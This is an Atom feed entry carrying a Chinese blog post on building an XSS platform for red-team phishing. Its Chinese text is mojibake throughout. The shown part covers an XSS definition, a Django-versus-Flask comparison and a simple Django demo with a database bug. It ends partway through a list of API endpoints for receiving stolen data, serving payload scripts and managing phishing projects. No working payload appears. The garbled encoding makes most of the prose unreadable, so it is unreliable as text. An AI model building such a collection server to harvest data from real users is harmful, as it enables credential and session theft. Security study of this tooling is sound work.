    <title>ä»é›¶å¼€å§‹ç¼–å†™XSSå¹³å°</title>
    <link href="https://www.ascotbe.com/2021/01/08/CrossSiteScripting/"/>
    <id>https://www.ascotbe.com/2021/01/08/CrossSiteScripting/</id>
    <published>2021-01-08T10:45:42.000Z</published>
    <updated>2021-05-17T00:32:35.016Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>å£°æ˜</p></blockquote><p>éƒ‘é‡å£°æ˜ï¼šæ–‡ä¸­æ‰€æ¶‰åŠçš„æŠ€æœ¯ã€æ€è·¯å’Œå·¥å…·ä»…ä¾›ä»¥å®‰å…¨ä¸ºç›®çš„çš„å­¦ä¹ äº¤æµä½¿ç”¨ï¼Œä»»ä½•äººä¸å¾—å°†å…¶ç”¨äºéæ³•ç”¨é€”ä»¥åŠç›ˆåˆ©ç­‰ç›®çš„ï¼Œå¦åˆ™åæœè‡ªè¡Œæ‰¿æ‹…ï¼</p><blockquote><p>å‰è¨€</p></blockquote><p>åœ¨æˆ‘ä»¬æ—¥å¸¸æ¸—é€æˆ–è€…çº¢é˜Ÿæ‰“ç‚¹çš„æ—¶å€™éƒ½æˆ–å¤šæˆ–å°‘çš„ä¼šæŒ–æ˜åˆ°XSSæ¼æ´ï¼Œç”±äºçº¢é˜Ÿé’“é±¼ä¹Ÿç»å¸¸ç”¨åˆ°XSSå¹³å°ï¼Œè™½ç„¶ç½‘ä¸Šå…è´¹å¯ä»¥æ³¨å†Œçš„å¹³å°å¾ˆå¤šï¼Œä½†æ˜¯è¿™äº›å¹³å°éƒ½æ˜¯åˆ«äººçš„é¦–å…ˆé’“é±¼åˆ°çš„æ•°æ®å¹¶ä¸æ˜¯åªæœ‰ä½ ä¸€ä¸ªäººå¯è§ï¼Œç½‘ç«™çš„ç®¡ç†å‘˜ä¹Ÿå¯ä»¥çœ‹çš„åˆ°ï¼Œè¿™å°±ä¼šå¯¹æŸäº›æ•æ„Ÿçš„çº¢é˜Ÿé¡¹ç›®çš„ä¿¡æ¯é€ æˆæ³„æ¼ï¼Œå…¶æ¬¡ç½‘ç«™ä¹Ÿç»å¸¸ä¸ç¨³å®šï¼Œå°å°åå¤©åŠä¸ªæœˆå°±è¦æ¢ä¸€ä¸ªå¹³å°é‡æ–°æ¥ä¸€æ¬¡ï¼Œæ‰€ä»¥è¿™ç¯‡æ–‡ç« å°±æ¥äº†~</p><ul><li>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/Ascotbe/Medusa">https://github.com/Ascotbe/Medusa</a></li></ul><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/CrossSiteScripting/1.gif" alt="938393FBC8A524B353CE58DCC17095F4" style="zoom:50%;" /><h2 id="ä»€ä¹ˆæ˜¯XSS"><a href="#ä»€ä¹ˆæ˜¯XSS" class="headerlink" title="ä»€ä¹ˆæ˜¯XSS"></a>ä»€ä¹ˆæ˜¯XSS</h2><p><strong>è·¨ç«™è„šæœ¬</strong>ï¼ˆè‹±è¯­ï¼šCross-site scriptingï¼Œé€šå¸¸ç®€ç§°ä¸ºï¼šXSSï¼‰æ˜¯ä¸€ç§ç½‘ç«™åº”ç”¨ç¨‹åºçš„å®‰å…¨æ¼æ´æ”»å‡»ï¼Œæ˜¯ä»£ç æ³¨å…¥çš„ä¸€ç§ã€‚å®ƒå…è®¸æ¶æ„ç”¨æˆ·å°†ä»£ç æ³¨å…¥åˆ°ç½‘é¡µä¸Šï¼Œå…¶ä»–ç”¨æˆ·åœ¨è§‚çœ‹ç½‘é¡µæ—¶å°±ä¼šå—åˆ°å½±å“ã€‚è¿™ç±»æ”»å‡»é€šå¸¸åŒ…å«äº†HTMLä»¥åŠç”¨æˆ·ç«¯è„šæœ¬è¯­è¨€ã€‚</p><p>Cross-site scriptingçš„è‹±æ–‡é¦–å­—æ¯ç¼©å†™æœ¬åº”ä¸º<strong>CSS</strong>ï¼Œä½†å› ä¸ºCSSåœ¨ç½‘é¡µè®¾è®¡é¢†åŸŸå·²ç»è¢«å¹¿æ³›æŒ‡å±‚å æ ·å¼è¡¨ï¼ˆCascading Style Sheetsï¼‰ï¼Œæ‰€ä»¥å°†Crossï¼ˆæ„ä¸ºâ€œäº¤å‰â€ï¼‰æ”¹ä»¥äº¤å‰å½¢çš„<strong>X</strong>åšä¸ºç¼©å†™ã€‚</p><p><strong>XSS</strong>æ”»å‡»é€šå¸¸æŒ‡çš„æ˜¯é€šè¿‡åˆ©ç”¨ç½‘é¡µå¼€å‘æ—¶ç•™ä¸‹çš„æ¼æ´ï¼Œé€šè¿‡å·§å¦™çš„æ–¹æ³•æ³¨å…¥æ¶æ„æŒ‡ä»¤ä»£ç åˆ°ç½‘é¡µï¼Œä½¿ç”¨æˆ·åŠ è½½å¹¶æ‰§è¡Œæ”»å‡»è€…æ¶æ„åˆ¶é€ çš„ç½‘é¡µç¨‹åºã€‚è¿™äº›æ¶æ„ç½‘é¡µç¨‹åºé€šå¸¸æ˜¯JavaScriptï¼Œä½†å®é™…ä¸Šä¹Ÿå¯ä»¥åŒ…æ‹¬Javaï¼ŒVBScriptï¼ŒActiveXï¼ŒFlashæˆ–è€…ç”šè‡³æ˜¯æ™®é€šçš„HTMLã€‚æ”»å‡»æˆåŠŸåï¼Œæ”»å‡»è€…å¯èƒ½å¾—åˆ°æ›´é«˜çš„æƒé™ï¼ˆå¦‚æ‰§è¡Œä¸€äº›æ“ä½œï¼‰ã€ç§å¯†ç½‘é¡µå†…å®¹ã€ä¼šè¯å’Œcookieç­‰å„ç§å†…å®¹ã€‚</p><h2 id="æ¡†æ¶é€‰ç”¨"><a href="#æ¡†æ¶é€‰ç”¨" class="headerlink" title="æ¡†æ¶é€‰ç”¨"></a>æ¡†æ¶é€‰ç”¨</h2><h3 id="ä»€ä¹ˆæ˜¯Django"><a href="#ä»€ä¹ˆæ˜¯Django" class="headerlink" title="ä»€ä¹ˆæ˜¯Django"></a>ä»€ä¹ˆæ˜¯Django</h3><p><strong>Django</strong>æ˜¯ä¸€ä¸ªå¼€æ”¾æºä»£ç çš„Webåº”ç”¨æ¡†æ¶ï¼Œç”±Pythonå†™æˆã€‚é‡‡ç”¨äº†MVTçš„è½¯ä»¶è®¾è®¡æ¨¡å¼ï¼Œå³æ¨¡å‹ï¼ˆModelï¼‰ï¼Œè§†å›¾ï¼ˆViewï¼‰å’Œæ¨¡æ¿ï¼ˆTemplateï¼‰ã€‚å®ƒåœ¨å¼€å‘åˆæœŸç”¨äºç®¡ç†åŠ³ä¼¦æ–¯å‡ºç‰ˆé›†å›¢æ——ä¸‹çš„ä¸€äº›ä»¥æ–°é—»ä¸ºä¸»çš„ç½‘ç«™ã€‚Djangoäº2005å¹´7æœˆåœ¨BSDè®¸å¯è¯ä¸‹å‘å¸ƒï¼Œå®ƒçš„åå­—æ¥æºäºæ¯”åˆ©æ—¶çš„å‰æ™®èµ›çˆµå£«å‰ä»–æ‰‹Django Reinhardtã€‚</p><p>Djangoçš„ä¸»è¦ç›®æ ‡æ˜¯ç®€åŒ–æ•°æ®åº“é©±åŠ¨çš„ç½‘ç«™çš„å¼€å‘ã€‚Djangoæ³¨é‡ç»„ä»¶çš„é‡ç”¨æ€§å’Œâ€œå¯æ’æ‹”æ€§â€ï¼Œæ•æ·å¼€å‘å’ŒDRYæ³•åˆ™ï¼ˆDonâ€™t Repeat Yourselfï¼‰ã€‚åœ¨Djangoä¸­æ™®éä½¿ç”¨çš„è¯­è¨€æ˜¯Pythonï¼Œç”šè‡³åŒ…æ‹¬é…ç½®æ–‡ä»¶å’Œæ•°æ®æ¨¡å‹ã€‚</p><h3 id="ä¸ºä»€ä¹ˆä¸ç”¨Flask"><a href="#ä¸ºä»€ä¹ˆä¸ç”¨Flask" class="headerlink" title="ä¸ºä»€ä¹ˆä¸ç”¨Flask"></a>ä¸ºä»€ä¹ˆä¸ç”¨Flask</h3><blockquote><p>Flask æ€ä¹ˆå®šä½è‡ªå·±çš„ï¼Ÿ</p></blockquote><p>å°†è‡ªå·±å®šä½ä¸ºå¾®æ¡†æ¶ã€‚<strong>å•¥å«å¾®æ¡†æ¶ï¼Œå°±æ˜¯æ¯›å¯æˆ¿çš„æ„æ€ã€‚ç»™ä½ ä¸ªæ¯›èƒšæˆ¿ï¼Œä½ è‡ªå·±è£…ä¿®å»ã€‚</strong></p><ul><li><p><strong>è¡¨å•æ€ä¹ˆè§£å†³ï¼Ÿ</strong>ä»ç¤¾åŒºæ‰¾äº†ä¸ª Flask-Form</p></li><li><p><strong>è·¨ç«™æ”»å‡»ï¼Ÿ</strong> ç¤¾åŒº Flask-Form å¸®ä½ åšäº†ã€‚</p></li><li><p><strong>ç™»é™†è®¤è¯é‰´æƒæ€ä¹ˆæå®šï¼Ÿ</strong> è‡ªå·±å†™ User æ¨¡å—ã€‚</p></li><li><p><strong>ORM æ€ä¹ˆæŒ‘é€‰ï¼Ÿ</strong>flask-sqlalchemy è‡ªå·±ç»„è£…ä¸€ä¸‹ã€‚ç­‰ç­‰ SQLAlchemy æ˜¯ä»€ä¹ˆç©æ„ï¼Ÿ query è¯­æ³•å†™èµ·æ¥æ€ä¹ˆè¿™ä¹ˆåŸå§‹â€¦</p></li><li><p><strong>DBMigration æ€ä¹ˆåšï¼Ÿ</strong> Alembic é…åˆ SQLAlchemy, ç­‰ç­‰ï¼ŒSQLAlchemy?? Alembic</p></li><li><p><strong>ç¼“å­˜æ€ä¹ˆåšï¼Ÿ</strong> è‡ªå·±æ‰‹åŠ¨å°è£…ä¸€ä¸‹ RedisPy</p></li></ul><blockquote><p>Django æ€ä¹ˆå®šä½æ ‡æ¦œè‡ªå·±çš„ï¼Ÿ</p></blockquote><p>åˆ’é‡ç‚¹ The web framework for perfectionists with deadlines. <strong>å®Œç¾ä¸»ä¹‰è€…çš„ Deadline ç»ˆç»“æ¡†æ¶</strong></p><p>å®šä½ä¸åŒï¼Œå°±ä¼šå¯¼è‡´è®¾è®¡ä¸Šå’ŒåŠŸèƒ½ä¸Šçš„å€¾å‘æ€§ã€‚</p><ul><li><p><strong>è¡¨å•æ€ä¹ˆè§£å†³ï¼Ÿ</strong> Django Form å¾ˆå¥½ç”¨å‘€ã€‚</p></li><li><p><strong>è·¨ç«™æ”»å‡»ï¼Ÿ</strong> Django å¸®ä½ åšäº† csrftoken</p></li><li><p><strong>ç™»é™†è®¤è¯é‰´æƒæ€ä¹ˆæå®šï¼Ÿ</strong> Django è‡ªå¸¦äº† backend å’Œ auth æ¨¡å—ã€‚</p></li><li><p><strong>ORM æ€ä¹ˆæŒ‘é€‰ï¼Ÿ</strong>Django ORM å¾ˆå¥½ç”¨ã€‚</p></li><li><p><strong>DBMigration æ€ä¹ˆåšï¼Ÿ</strong> Django Migration äº†è§£ä¸€äº›ï¼Ÿ</p></li><li><p><strong>ç¼“å­˜æ€ä¹ˆåšï¼Ÿ</strong> Django Cache äº†è§£ä¸€ä¸‹ï¼Ÿ</p></li></ul><p>è™½ç„¶æˆ‘ä»¬æ•´ä½“æ¶æ„éƒ½æ˜¯è‡ªå·±çº¯æ‰‹æ’¸ï¼Œä½¿ç”¨Flaskä¼šæ›´é€‚åˆæˆ‘ä»¬ï¼Œä½†æ˜¯å¤§å®¶æœ‰æ²¡æœ‰å¬è¿‡ä¸€å¥è¯ï¼š<strong>æˆ‘å¯ä»¥ä¸ç”¨ï¼Œä½†æ˜¯æˆ‘ä¸èƒ½æ²¡æœ‰ï¼ˆé€ƒ</strong></p><h3 id="Djangoç®€å•æ¼”ç¤º"><a href="#Djangoç®€å•æ¼”ç¤º" class="headerlink" title="Djangoç®€å•æ¼”ç¤º"></a>Djangoç®€å•æ¼”ç¤º</h3><h4 id="é¦–å…ˆåˆ›å»ºä¸€ä¸ªé¡¹ç›®"><a href="#é¦–å…ˆåˆ›å»ºä¸€ä¸ªé¡¹ç›®" class="headerlink" title="é¦–å…ˆåˆ›å»ºä¸€ä¸ªé¡¹ç›®"></a>é¦–å…ˆåˆ›å»ºä¸€ä¸ªé¡¹ç›®</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 django-admin.py  startproject demo</span><br></pre></td></tr></table></figure><p>é¡¹ç›®ä¸­åªæœ‰3ä¸ªå‡½æ•°</p><ul><li>æ˜¾ç¤ºæ–‡æœ¬</li><li>åŠ æ³•è¿ç®—</li><li>åŠ æ³•è¿ç®—åå†™å…¥æ•°æ®åº“</li></ul><h4 id="é¡¹ç›®ç»“æ„"><a href="#é¡¹ç›®ç»“æ„" class="headerlink" title="é¡¹ç›®ç»“æ„"></a>é¡¹ç›®ç»“æ„</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">â”œâ”€â”€ demo</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ asgi.py   </span><br><span class="line">â”‚Â Â  â”œâ”€â”€ __init__.py</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ settings.py</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ urls.py</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ wsgi.py</span><br><span class="line">â”‚Â Â  â””â”€â”€ XSS</span><br><span class="line">â”‚Â Â      â”œâ”€â”€ __init__.py</span><br><span class="line">â”‚Â Â      â””â”€â”€ test.py</span><br><span class="line">â”œâ”€â”€ manage.py</span><br><span class="line">â”œâ”€â”€ Database.py</span><br><span class="line">â””â”€â”€ xss.db</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ç»“æ„ä¸­æˆ‘ä»¬åªéœ€è¦å…³è¿™ä¸‰ä¸ªæ–‡ä»¶</p><ul><li><p><code>Database.py</code>æ•°æ®åº“å†™å…¥ç›¸å…³æ–‡ä»¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetRootFileLocation</span>:</span>  <span class="comment"># è·å–å½“å‰æ–‡ä»¶è·¯å¾„ç±»</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Result</span>(<span class="params">self</span>) -&gt; str:</span></span><br><span class="line">        system_type = sys.platform</span><br><span class="line">        <span class="keyword">if</span> system_type == <span class="string">&quot;win32&quot;</span> <span class="keyword">or</span> system_type == <span class="string">&quot;cygwin&quot;</span>:</span><br><span class="line">            RootFileLocation = os.path.split(os.path.realpath(__file__))[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">return</span> RootFileLocation</span><br><span class="line">        <span class="keyword">elif</span> system_type == <span class="string">&quot;linux&quot;</span> <span class="keyword">or</span> system_type == <span class="string">&quot;darwin&quot;</span>:</span><br><span class="line">            RootFileLocation = os.path.split(os.path.realpath(__file__))[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">return</span> RootFileLocation</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetDatabaseFilePath</span>:</span>  <span class="comment"># æ•°æ®åº“æ–‡ä»¶è·¯å¾„è¿”å›å€¼</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">result</span>(<span class="params">self</span>) -&gt; str:</span></span><br><span class="line">        <span class="keyword">if</span> sys.platform == <span class="string">&quot;win32&quot;</span> <span class="keyword">or</span> sys.platform == <span class="string">&quot;cygwin&quot;</span>:</span><br><span class="line">            DatabaseFilePath = GetRootFileLocation().Result() + <span class="string">&quot;\\xss.db&quot;</span></span><br><span class="line">            <span class="keyword">return</span> DatabaseFilePath</span><br><span class="line">        <span class="keyword">elif</span> sys.platform == <span class="string">&quot;linux&quot;</span> <span class="keyword">or</span> sys.platform == <span class="string">&quot;darwin&quot;</span>:</span><br><span class="line">            DatabaseFilePath = GetRootFileLocation().Result() + <span class="string">&quot;/xss.db&quot;</span></span><br><span class="line">            <span class="keyword">return</span> DatabaseFilePath</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdditionOperation</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.con = sqlite3.connect(GetDatabaseFilePath().result())</span><br><span class="line">        <span class="comment"># è·å–æ‰€åˆ›å»ºæ•°æ®çš„æ¸¸æ ‡</span></span><br><span class="line">        self.cur = self.con.cursor()</span><br><span class="line">        <span class="comment"># åˆ›å»ºè¡¨</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.cur.execute(<span class="string">&quot;CREATE TABLE AdditionOperation\</span></span><br><span class="line"><span class="string">                                (id INTEGER PRIMARY KEY,\</span></span><br><span class="line"><span class="string">                                a TEXT NOT NULL,\</span></span><br><span class="line"><span class="string">                                b TEXT NOT NULL,\</span></span><br><span class="line"><span class="string">                                calculation result TEXT NOT NULL)&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Write</span>(<span class="params">self, **kwargs</span>) -&gt; bool or <span class="keyword">None</span>:</span>  <span class="comment"># å†™å…¥ç›¸å…³ä¿¡æ¯</span></span><br><span class="line"></span><br><span class="line">        A = kwargs.get(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">        B = kwargs.get(<span class="string">&quot;b&quot;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.cur.execute(<span class="string">&quot;INSERT INTO AdditionOperation(a,b,calculation)\</span></span><br><span class="line"><span class="string">                VALUES (?,?,?)&quot;</span>, (A,B,<span class="built_in">int</span>(A)+<span class="built_in">int</span>(B),))</span><br><span class="line">            <span class="comment"># æäº¤</span></span><br><span class="line">            self.con.commit()</span><br><span class="line">            self.con.close()</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure></li><li><p><code>urls.py</code>è·¯ç”±è¡¨ï¼Œç”¨æ¥è¡¨ç¤ºè¿æ¥å’Œè·¯ç”±çš„å…³ç³»</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> demo.XSS.test <span class="keyword">import</span> SayHello,Add,AddToDatabase</span><br><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">&#x27;sey_hello/&#x27;</span>, SayHello),</span><br><span class="line">    path(<span class="string">&#x27;add/&#x27;</span>, Add),</span><br><span class="line">    path(<span class="string">&#x27;add_to_database/&#x27;</span>, AddToDatabase),</span><br><span class="line">]</span><br></pre></td></tr></table></figure></li><li><p><code>test.py</code>æ¼”ç¤ºçš„ä¸‰ä¸ªå‡½æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> JsonResponse</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> Database <span class="keyword">import</span> AdditionOperation</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SayHello</span>(<span class="params">request</span>):</span><span class="comment">#åˆ¤æ–­è¯·æ±‚æ–¹å¼åè¯´ä½ å¥½</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Hello this is POST~&#x27;</span>, <span class="string">&#x27;code&#x27;</span>: <span class="number">200</span>, &#125;)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Hello this is GET&#x27;</span>, <span class="string">&#x27;code&#x27;</span>: <span class="number">200</span>, &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span>(<span class="params">request</span>):</span><span class="comment">#è¿›è¡ŒåŠ æ³•</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        A = json.loads(request.body)[<span class="string">&quot;a&quot;</span>]</span><br><span class="line">        B = json.loads(request.body)[<span class="string">&quot;b&quot;</span>]</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="built_in">int</span>(A)+<span class="built_in">int</span>(B), <span class="string">&#x27;code&#x27;</span>: <span class="number">200</span>, &#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;è¯·ä½¿ç”¨POSTï¼&#x27;</span>, <span class="string">&#x27;code&#x27;</span>: <span class="number">500</span>, &#125;)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;a&quot;: &quot;1&quot;,</span></span><br><span class="line"><span class="string">&quot;b&quot;: &quot;2&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AddToDatabase</span>(<span class="params">request</span>):</span><span class="comment">#è¿›è¡ŒåŠ æ³•åå†™å…¥æ•°æ®åº“</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        A = json.loads(request.body)[<span class="string">&quot;a&quot;</span>]</span><br><span class="line">        B = json.loads(request.body)[<span class="string">&quot;b&quot;</span>]</span><br><span class="line">        AdditionOperation().Write(a=A,b=B)</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="built_in">int</span>(A)+<span class="built_in">int</span>(B), <span class="string">&#x27;code&#x27;</span>: <span class="number">200</span>, &#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;è¯·ä½¿ç”¨POSTï¼&#x27;</span>, <span class="string">&#x27;code&#x27;</span>: <span class="number">500</span>, &#125;)</span><br></pre></td></tr></table></figure></li></ul><h4 id="æ¼”ç¤ºæ•ˆæœ"><a href="#æ¼”ç¤ºæ•ˆæœ" class="headerlink" title="æ¼”ç¤ºæ•ˆæœ"></a>æ¼”ç¤ºæ•ˆæœ</h4><p>åœ¨æ–‡ä»¶æ›´ç›®å½•å¯åŠ¨é¡¹ç›®</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 manage.py runserver <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">9999</span> --insecure   </span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/CrossSiteScripting/2.gif" alt="1"></p><p>å¯ä»¥çœ‹åˆ°æ•°æ®åº“æ–‡ä»¶ä¸­ä¹Ÿå†™å…¥äº†ç›¸å…³æ•°æ®</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/CrossSiteScripting/3.png" alt="image-20210108160831363"></p><h2 id="å¹³å°è®¾è®¡"><a href="#å¹³å°è®¾è®¡" class="headerlink" title="å¹³å°è®¾è®¡"></a>å¹³å°è®¾è®¡</h2><h3 id="é¡¹ç›®å…³ç³»å›¾"><a href="#é¡¹ç›®å…³ç³»å›¾" class="headerlink" title="é¡¹ç›®å…³ç³»å›¾"></a>é¡¹ç›®å…³ç³»å›¾</h3><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/CrossSiteScripting/4.png" alt="å›¾ç‰‡1"></p><h3 id="é¡¹ç›®çš„é€»è¾‘"><a href="#é¡¹ç›®çš„é€»è¾‘" class="headerlink" title="é¡¹ç›®çš„é€»è¾‘"></a>é¡¹ç›®çš„é€»è¾‘</h3><p>é™¤å»å­˜æ”¾ç±»å‡½æ•°çš„æ–‡ä»¶å’Œç”¨æˆ·è®¤è¯æ–‡ä»¶ï¼Œæ•´ä½“çš„æ–‡ä»¶é€»è¾‘å¦‚ä¸‹å›¾</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/CrossSiteScripting/5.png" alt="image-20210108135555397"></p><h3 id="APIæ¥å£"><a href="#APIæ¥å£" class="headerlink" title="APIæ¥å£"></a>APIæ¥å£</h3><p>ä¸€ä¸ªXSSå¹³å°åœ¨ä¸è€ƒè™‘ç”¨æˆ·ç™»å½•çš„æƒ…å†µä¸‹ï¼Œåªéœ€è¦<strong>11</strong>ä¸ªAPIæ¥å£ä»¥åŠ<strong>3</strong>å¼ è¡¨å³å¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">æ¥æ”¶æ•°æ®ï¼š&#x2F;a&#x2F;xxxxx</span><br><span class="line">åŠ è½½æ–‡ä»¶ï¼š&#x2F;s&#x2F;xxxxx</span><br><span class="line">åˆ›å»ºè·¨ç«™è„šæœ¬é’“é±¼é¡¹ç›®ï¼š&#x2F;api&#x2F;create_cross_site_script_project&#x2F; </span><br><span class="line">æŸ¥è¯¢è·¨ç«™è„šæœ¬é’“é±¼é¡¹ç›®ï¼š&#x2F;api&#x2F;query_cross_site_script_project&#x2F;</span><br><span class="line">æŸ¥è¯¢è·¨ç«™è„šæœ¬é’“é±¼é¡¹ç›®æ¥æ”¶çš„æ•°æ®ï¼š&#x2F;api&#x2F;query_cross_site_script_project_data&#x2F;</span><br><span class="line">è¯»å–ç”¨æˆ·è‡ªå®šä¹‰è·¨ç«™è„šæœ¬æ¨¡æ¿æ•°æ®ï¼š&#x2F;api&#x2F;read_cross_site_script_template&#x2F;</span><br><span class="line">è¯»å–é»˜è®¤è·¨ç«™è„šæœ¬æ¨¡æ¿æ•°æ®ï¼š&#x2F;api&#x2F;read_default_cross_site_script_template&#x2F;</span><br><span class="line">ä¿å­˜ç”¨æˆ·è‡ªå®šä¹‰è·¨ç«™è„šæœ¬æ¨¡æ¿æ•°æ®ï¼š&#x2F;api&#x2F;save_cross_site_script_template&#x2F;</span><br><span class="line">ä¿®æ”¹ç”¨æˆ·è‡ªå®šä¹‰è·¨ç«™è„šæœ¬æ¨¡æ¿æ•°æ®ï¼š&#x2F;api&#x2F;modify_cross_site_script_template&#x2F;</span><br><span class="line">ä¿®æ”¹è·¨ç«™è„šæœ¬é’“é±¼é¡¹ç›®ï¼š&#x2F;api&#x2F;modify_cross_site_script_project&#x2F;</span><br><span 